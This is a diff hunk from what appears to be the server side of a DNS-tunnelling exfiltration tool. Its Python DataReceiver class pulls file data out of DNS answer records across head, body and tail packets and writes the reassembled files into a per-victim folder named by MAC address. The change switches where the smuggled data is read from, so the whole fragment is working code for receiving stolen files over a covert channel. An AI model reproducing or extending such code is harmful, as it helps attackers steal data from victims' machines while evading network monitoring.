@@ -79,17 +79,17 @@ class DataReceiver():
 
         # Determine if it is a head, body, or tail packet
         if dnsqr_layer.qclass == DataRequestType.HEAD:
-            # Create entry, parse DNSRR.rrname
-            self.file_transfer[key] = ''
+            # Create entry, append data
+            dnsrr_layer = pkt.getlayer(DNSRR)
+            self.file_transfer[key] = dnsrr_layer.rdata
         elif dnsqr_layer.qclass == DataRequestType.NORMAL:
             dnsrr_layer = pkt.getlayer(DNSRR)
-            data_fields = dnsrr_layer.rrname[:-1].split('.')
-            buffer = ''
-            for i in range(1, len(data_fields) - 3):
-                buffer += data_fields[i]
-
-            self.file_transfer[key] += buffer
+            self.file_transfer[key] += dnsrr_layer.rdata
         elif dnsqr_layer.qclass == DataRequestType.TAIL:
+
+            dnsrr_layer = pkt.getlayer(DNSRR)
+            self.file_transfer[key] += dnsrr_layer.rdata
+
             # Write to file from buffer
             victim_dir = self.rel_path + str(victim_mac)
             with open(victim_dir + '/files/' + filename, 'w+') as f:
